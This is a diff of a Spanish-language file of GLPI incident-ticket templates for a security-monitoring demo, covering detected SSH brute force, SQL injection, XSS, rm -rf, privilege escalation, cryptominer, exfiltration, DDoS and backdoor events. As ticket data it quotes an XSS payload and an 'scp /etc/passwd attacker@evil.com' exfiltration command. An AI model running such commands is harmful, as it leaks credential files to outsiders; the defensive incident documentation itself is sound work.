@@ -8,7 +8,7 @@ Instrucciones: Copiar y pegar en GLPI → Asistencia → Crear ticket
 Título: MEDIUM: SSH Brute Force desde 192.168.1.50 - 04/02/2026
 
 Descripción:
-⚠️ ATAQUE SSH BRUTE FORCE
+ATAQUE SSH BRUTE FORCE
 Timestamp: 04/02/2026 [HORA]
 Host afectado: syslog-client
 IP Origen: 192.168.1.50
@@ -37,7 +37,7 @@ Configuración: Tipo=Incident, Urgencia=Medium, Prioridad=3-Medium
 Título: HIGH: SQL Injection en aplicación web - 04/02/2026
 
 Descripción:
-⚠️ ATAQUE SQL INJECTION
+ATAQUE SQL INJECTION
 Timestamp: 04/02/2026 [HORA]
 Host afectado: syslog-client (Apache)
 IP Origen: 192.168.1.105
@@ -68,7 +68,7 @@ Configuración: Tipo=Incident, Urgencia=High, Prioridad=4-High
 Título: HIGH: XSS Attack detectado en formulario web - 04/02/2026
 
 Descripción:
-⚠️ ATAQUE CROSS-SITE SCRIPTING (XSS)
+ATAQUE CROSS-SITE SCRIPTING (XSS)
 Timestamp: 04/02/2026 [HORA]
 Host afectado: syslog-client (Apache)
 Payload: <script>alert('XSS')</script>
@@ -90,17 +90,15 @@ SLA: 1h respuesta / 24h resolución
 ESCALAR: Desarrollo + Seguridad
 ```
 
-**Configuración**: Tipo=Incident, Urgencia=High, Prioridad=4-High
+Configuración: Tipo=Incident, Urgencia=High, Prioridad=4-High
 
----
-
-## 4️⃣ COMANDO DESTRUCTIVO (CRITICAL)
+## 4. COMANDO DESTRUCTIVO (CRITICAL)
 
 ```
 Título: CRÍTICO: Comando destructivo rm -rf ejecutado - 04/02/2026
 
 Descripción:
-⚠️ INCIDENTE CRÍTICO - COMANDO DESTRUCTIVO
+INCIDENTE CRÍTICO - COMANDO DESTRUCTIVO
 Timestamp: 04/02/2026 [HORA]
 Host afectado: syslog-client
 Usuario: root
@@ -125,17 +123,15 @@ SLA: 15 min respuesta / 4h resolución
 ESCALAR: CISO + Dirección TI (URGENTE)
 ```
 
-**Configuración**: Tipo=Incident, Urgencia=Very High, Prioridad=6-Major
+Configuración: Tipo=Incident, Urgencia=Very High, Prioridad=6-Major
 
----
-
-## 5️⃣ ESCALADA DE PRIVILEGIOS (CRITICAL)
+## 5. ESCALADA DE PRIVILEGIOS (CRITICAL)
 
 ```
 Título: CRÍTICO: Escalada de privilegios detectada - 04/02/2026
 
 Descripción:
-⚠️ INCIDENTE CRÍTICO - PRIVILEGE ESCALATION
+INCIDENTE CRÍTICO - PRIVILEGE ESCALATION
 Timestamp: 04/02/2026 [HORA]
 Host afectado: syslog-client
 Usuario origen: user01 → root
@@ -159,17 +155,15 @@ SLA: 15 min respuesta / 4h resolución
 ESCALAR: CISO + Administradores (URGENTE)
 ```
 
-**Configuración**: Tipo=Incident, Urgencia=Very High, Prioridad=6-Major
+Configuración: Tipo=Incident, Urgencia=Very High, Prioridad=6-Major
 
----
-
-## 6️⃣ PORT SCANNING (MEDIUM)
+## 6. PORT SCANNING (MEDIUM)
 
 ```
 Título: MEDIUM: Port Scanning desde 192.168.1.75 - 04/02/2026
 
 Descripción:
-⚠️ PORT SCANNING DETECTADO
+PORT SCANNING DETECTADO
 Timestamp: 04/02/2026 [HORA]
 Host objetivo: syslog-client
 IP Origen: 192.168.1.75
@@ -191,17 +185,15 @@ TAXONOMÍA: VERIS - Hacking/Network probing
 SLA: 4h respuesta / 3 días resolución
 ```
 
-**Configuración**: Tipo=Incident, Urgencia=Medium, Prioridad=3-Medium
+Configuración: Tipo=Incident, Urgencia=Medium, Prioridad=3-Medium
 
----
-
-## 7️⃣ PROCESOS SOSPECHOSOS (HIGH)
+## 7. PROCESOS SOSPECHOSOS (HIGH)
 
 ```
 Título: HIGH: Proceso sospechoso cryptominer detectado - 04/02/2026
 
 Descripción:
-⚠️ PROCESO MALICIOSO DETECTADO
+PROCESO MALICIOSO DETECTADO
 Timestamp: 04/02/2026 [HORA]
 Host afectado: syslog-client
 Proceso: /tmp/.hidden/cryptominer
@@ -227,17 +219,15 @@ SLA: 1h respuesta / 24h resolución
 ESCALAR: Seguridad + Forense
 ```
 
-**Configuración**: Tipo=Incident, Urgencia=High, Prioridad=4-High
+Configuración: Tipo=Incident, Urgencia=High, Prioridad=4-High
 
----
-
-## 8️⃣ EXFILTRACIÓN DE DATOS (HIGH)
+## 8. EXFILTRACIÓN DE DATOS (HIGH)
 
 ```
 Título: HIGH: Exfiltración de datos detectada - 04/02/2026
 
 Descripción:
-⚠️ DATA EXFILTRATION DETECTADA
+DATA EXFILTRATION DETECTADA
 Timestamp: 04/02/2026 [HORA]
 Host afectado: syslog-client
 Comando: scp /etc/passwd attacker@evil.com
@@ -263,17 +253,15 @@ ESCALAR: CISO + DPO + Legal (URGENTE)
 REGULATORIO: Posible GDPR breach
 ```
 
-**Configuración**: Tipo=Incident, Urgencia=Very High, Prioridad=5-Very High
+Configuración: Tipo=Incident, Urgencia=Very High, Prioridad=5-Very High
 
----
-
-## 9️⃣ DDoS SIMULATION (MEDIUM)
+## 9. DDoS SIMULATION (MEDIUM)
 
 ```
 Título: MEDIUM: Posible DDoS desde múltiples IPs - 04/02/2026
 
 Descripción:
-⚠️ ATAQUE DDoS DETECTADO
+ATAQUE DDoS DETECTADO
 Timestamp: 04/02/2026 [HORA]
 Host objetivo: syslog-client
 Tipo: SYN flood
@@ -296,17 +284,15 @@ TAXONOMÍA: VERIS - Hacking/DoS
 SLA: 4h respuesta / 3 días resolución
 ```
 
-**Configuración**: Tipo=Incident, Urgencia=Medium, Prioridad=3-Medium
+Configuración: Tipo=Incident, Urgencia=Medium, Prioridad=3-Medium
 
----
-
-## 🔟 MALWARE DETECTION (HIGH)
+## 10. MALWARE DETECTION (HIGH)
 
 ```
 Título: HIGH: Malware backdoor.sh detectado - 04/02/2026
 
 Descripción:
-⚠️ MALWARE DETECTADO EN SISTEMA
+MALWARE DETECTADO EN SISTEMA
 Timestamp: 04/02/2026 [HORA]
 Host afectado: syslog-client
 Archivo: /tmp/backdoor.sh
@@ -332,17 +318,15 @@ SLA: 1h respuesta / 24h resolución
 ESCALAR: Seguridad + Forense + CISO
 ```
 
-**Configuración**: Tipo=Incident, Urgencia=High, Prioridad=4-High
+Configuración: Tipo=Incident, Urgencia=High, Prioridad=4-High
 
----
-
-## 1️⃣1️⃣ UNAUTHORIZED ACCESS (MEDIUM)
+## 11. UNAUTHORIZED ACCESS (MEDIUM)
 
 ```
 Título: MEDIUM: Acceso no autorizado a directorio /etc - 04/02/2026
 
 Descripción:
-⚠️ ACCESO NO AUTORIZADO DETECTADO
+ACCESO NO AUTORIZADO DETECTADO
 Timestamp: 04/02/2026 [HORA]
 Host afectado: syslog-client
 Usuario: nobody (UID 99)
@@ -365,49 +349,43 @@ TAXONOMÍA: VERIS - Misuse/Unauthorized access
 SLA: 4h respuesta / 3 días resolución
 ```
 
-**Configuración**: Tipo=Incident, Urgencia=Medium, Prioridad=3-Medium
+Configuración: Tipo=Incident, Urgencia=Medium, Prioridad=3-Medium
 
----
+## RESUMEN POR SEVERIDAD
 
-## 📋 RESUMEN POR SEVERIDAD
+CRITICAL (2 tickets):
+- 4. Comando Destructivo
+- 5. Escalada de Privilegios
 
-### CRITICAL (2 tickets):
-- 4️⃣ Comando Destructivo
-- 5️⃣ Escalada de Privilegios
+HIGH (5 tickets):
+- 2. SQL Injection
+- 3. XSS Attack
+- 7. Procesos Sospechosos
+- 8. Exfiltración de Datos
+- 10. Malware Detection
 
-### HIGH (5 tickets):
-- 2️⃣ SQL Injection
-- 3️⃣ XSS Attack
-- 7️⃣ Procesos Sospechosos
-- 8️⃣ Exfiltración de Datos
-- 🔟 Malware Detection
+MEDIUM (4 tickets):
+- 1. SSH Brute Force
+- 6. Port Scanning
+- 9. DDoS Simulation
+- 11. Unauthorized Access
 
-### MEDIUM (4 tickets):
-- 1️⃣ SSH Brute Force
-- 6️⃣ Port Scanning
-- 9️⃣ DDoS Simulation
-- 1️⃣1️⃣ Unauthorized Access
+## PARA LA DEMO
 
----
+Recomendación: Crea solo 1-2 tickets durante la presentación (máximo 5 minutos). Los más impactantes:
 
-## 🎯 PARA LA DEMO
+1. Comando Destructivo (CRITICAL) - Ticket #4 (MEJOR OPCIÓN)
+2. SQL Injection (HIGH) - Ticket #2
 
-**Recomendación**: Crea solo **1-2 tickets** durante la presentación (máximo 5 minutos). Los más impactantes:
+Los otros 9: Menciona que ya están documentados pero por tiempo solo mostrarás el crítico.
 
-1. **Comando Destructivo (CRITICAL)** → Ticket #4 ⭐ MEJOR OPCIÓN
-2. **SQL Injection (HIGH)** → Ticket #2
+Frase para la demo: 
+"El sistema ha detectado 11 tipos de ataques diferentes. Por tiempo, voy a documentar el más crítico: comando destructivo. Los otros 10 ya están documentados siguiendo el mismo proceso."
 
-**Los otros 9**: Menciona que ya están documentados pero por tiempo solo mostrarás el crítico.
+## TIPS
 
-**Frase para la demo**: 
-> "El sistema ha detectado 11 tipos de ataques diferentes. Por tiempo, voy a documentar el más crítico: comando destructivo. Los otros 10 ya están documentados siguiendo el mismo proceso."
-
----
-
-## 💡 TIPS
-
-- **Copiar rápido**: Ctrl + C todo el bloque
-- **Pegar en GLPI**: Campo Descripción soporta múltiples líneas
-- **Timestamp**: Reemplaza [HORA] con hora actual
-- **IP/PID**: Puedes dejar genéricos o copiar de Kibana
-- **Durante demo**: Solo crear 1 ticket (el CRITICAL), mencionar que proceso se repite para los otros 10
+- Copiar rápido: Ctrl + C todo el bloque
+- Pegar en GLPI: Campo Descripción soporta múltiples líneas
+- Timestamp: Reemplaza [HORA] con hora actual
+- IP/PID: Puedes dejar genéricos o copiar de Kibana
+- Durante demo: Solo crear 1 ticket (el CRITICAL), mencionar que proceso se repite para los otros 10
